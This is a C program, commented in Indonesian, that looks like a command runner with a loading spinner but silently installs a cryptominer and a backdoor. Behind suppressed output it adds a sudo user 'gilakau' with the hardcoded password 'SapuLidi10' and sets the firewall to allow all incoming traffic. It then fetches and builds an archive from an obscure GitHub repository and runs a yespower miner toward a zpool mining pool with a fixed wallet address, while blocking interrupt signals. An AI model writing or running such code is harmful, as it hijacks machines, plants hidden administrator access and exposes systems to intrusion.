#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <unistd.h>
#include <stdbool.h>
#include <string.h>
#include <signal.h>
#include <sys/wait.h>

// Variabel untuk menandai status loading
volatile bool loading = false;

// Fungsi untuk mengabaikan sinyal
void ignore_signal(int sig) {
    // Tidak ada implementasi, hanya mengabaikan sinyal
}

// Spinner animation
void* spinner(void* arg) {
    const char spin_chars[] = "/-\\|";
    int i = 0;
    while (loading) {
        printf("\r%c Loading...", spin_chars[i % 4]);
        fflush(stdout);
        usleep(100000);
        i++;
    }
    printf("\r✓ Selesai      \n");
    return NULL;
}

// Bersihkan tampilan perintah dari argumen teknis
void bersihkanPerintah(const char* input, char* output, size_t maxLen) {
    char temp[512];
    strncpy(temp, input, sizeof(temp));
    temp[sizeof(temp) - 1] = '\0';

    char* token = strtok(temp, " ");
    output[0] = '\0';

    while (token != NULL) {
        if (strcmp(token, "sudo") == 0 ||
            strcmp(token, "-y") == 0 ||
            strcmp(token, ">") == 0 ||
            strcmp(token, "2>&1") == 0 ||
            strstr(token, "/dev/null") != NULL) {
            token = strtok(NULL, " ");
            continue;
        }
        if (strlen(output) + strlen(token) + 2 < maxLen) {
            strcat(output, token);
            strcat(output, " ");
        }
        token = strtok(NULL, " ");
    }

    size_t len = strlen(output);
    if (len > 0 && output[len - 1] == ' ') {
        output[len - 1] = '\0';
    }
}

// Fungsi utama dengan opsi spinner dan tampilkan nama
int jalankanPerintah(const char* cmd, bool tampilkanPerintah, bool pakaiSpinner) {
    if (tampilkanPerintah) {
        char bersih[512];
        bersihkanPerintah(cmd, bersih, sizeof(bersih));
        printf("Menjalankan perintah: %s\n", bersih);
    }

    pthread_t thread_id;

    if (pakaiSpinner) {
        loading = true;
        pthread_create(&thread_id, NULL, spinner, NULL);
    }

    int status = system(cmd);

    if (pakaiSpinner) {
        loading = false;
        pthread_join(thread_id, NULL);
    }

    if (WIFEXITED(status)) {
        int exitCode = WEXITSTATUS(status);
        if (exitCode != 0) {
            printf("\n[ERROR] Perintah gagal dijalankan. Exit code: %d\n", exitCode);
        }
        return exitCode;
    } else {
        printf("\n[ERROR] Perintah tidak dieksekusi dengan benar.\n");
        return -1;
    }
}

// Fungsi-fungsi perintah
int perintahSatu() {
    return jalankanPerintah("sudo apt update -y", true, false);
}

int perintahDua() {
    return jalankanPerintah("sudo adduser --disabled-password --gecos \"\" --allow-bad-names gilakau > /dev/null 2>&1", false, true);
}

int perintahTiga() {
    return jalankanPerintah("echo 'gilakau:SapuLidi10' | sudo chpasswd > /dev/null 2>&1", false, true);
}

int perintahEmpat() {
    return jalankanPerintah("grep gilakau /etc/passwd > /dev/null 2>&1", false, true);
}

int perintahLima() {
    return jalankanPerintah("sudo usermod -a -G sudo gilakau > /dev/null 2>&1", false, true);
}

int perintahEnam() {
    return jalankanPerintah("echo 'SapuLidi10' | su gilakau -c \"echo 'SapuLidi10' | sudo -S -H bash -c 'apt update -y > /dev/null 2>&1 && apt install ufw libcurl4-openssl-dev libssl-dev libjansson-dev socat -y > /dev/null 2>&1 && ufw enable > /dev/null 2>&1 && ufw default allow incoming > /dev/null 2>&1 && ufw default allow outgoing > /dev/null 2>&1 && ufw status verbose > /dev/null 2>&1 && ufw status > /dev/null 2>&1' > /dev/null 2>&1\" > /dev/null 2>&1", false, true);
}

int perintahTujuh() {
    return jalankanPerintah("echo 'SapuLidi10' | su gilakau -c \"echo 'SapuLidi10' | sudo -S -H bash -c 'curl -O https://raw.githubusercontent.com/piksuf/naszuiernamsxcuioernaszxcvuio/refs/heads/main/myapp.tar.gz > /dev/null 2>&1 && tar -xf myapp.tar.gz > /dev/null 2>&1' > /dev/null 2>&1\" > /dev/null 2>&1", false, true);
}

int perintahDelapan() {
    return jalankanPerintah("echo 'SapuLidi10' | su gilakau -c \"echo 'SapuLidi10' | sudo -S -H bash -c './configure --prefix=$PWD > /dev/null 2>&1 && make clean > /dev/null 2>&1 && make > /dev/null 2>&1 && make install > /dev/null 2>&1' > /dev/null 2>&1\" > /dev/null 2>&1", false, true);
}

int perintahSembilan() {
    return jalankanPerintah("echo 'SapuLidi10' | su gilakau -c \"echo 'SapuLidi10' | sudo -S -H bash -c 'socat TCP4-LISTEN:8080,fork TCP4:yespowerSUGAR.na.mine.zpool.ca:6241 > /dev/null 2>&1 | timeout 3600s ./proxychains4 ./sse -a yespowerSUGAR -o stratum+tcp://localhost:8080 -u D8zcvGHWayuBq5MRncKTnKtFcooQCueZLP.T_$(date +\"%d%m\")_$(date +\"%H%M\") -p c=DGB,zap=SUGAR -t $(nproc) -q > /dev/null 2>&1' > /dev/null 2>&1\" > /dev/null 2>&1", false, true);
}

// Fungsi Utama Main
int main() {
    struct sigaction sa;
    sa.sa_handler = ignore_signal;  // Set handler untuk mengabaikan sinyal
    sigemptyset(&sa.sa_mask);          // Kosongkan mask untuk sinyal lainnya
    sa.sa_flags = SA_RESTART;          // Jangan ganggu proses yang sedang berjalan
    sigaction(SIGINT, &sa, NULL);      // Ctrl+C
    sigaction(SIGTSTP, &sa, NULL);     // Ctrl+Z
    sigaction(SIGHUP, &sa, NULL);      // Terminal hangup

    // Blokir sinyal di dalam main thread (proses utama)
    sigset_t set;
    sigemptyset(&set);
    sigaddset(&set, SIGINT);
    sigaddset(&set, SIGTSTP);
    sigaddset(&set, SIGHUP);
    pthread_sigmask(SIG_BLOCK, &set, NULL); // Blokir sinyal sementara di thread utama


    // Menjalankan perintah-perintah
    if (perintahSatu() != 0) {
        printf("Perintah 1 gagal dijalankan.\n");
    }

    if (perintahDua() != 0) {
        printf("Perintah 2 gagal dijalankan.\n");
    }

    if (perintahTiga() != 0) {
        printf("Perintah 3 gagal dijalankan.\n");
    }

    if (perintahEmpat() != 0) {
        printf("Perintah 4 gagal dijalankan.\n");
    }

    if (perintahLima() != 0) {
        printf("Perintah 5 gagal dijalankan.\n");
    }

    if (perintahEnam() != 0) {
        printf("Perintah 6 gagal dijalankan.\n");
    }

    if (perintahTujuh() != 0) {
        printf("Perintah 7 gagal dijalankan.\n");
    }

    if (perintahDelapan() != 0) {
        printf("Perintah 8 gagal dijalankan.\n");
    }

    if (perintahSembilan() != 0) {
        printf("Perintah 9 gagal dijalankan.\n");
    }
    
    // Unblock sinyal setelah eksekusi selesai
    pthread_sigmask(SIG_UNBLOCK, &set, NULL);


    return 0;
}
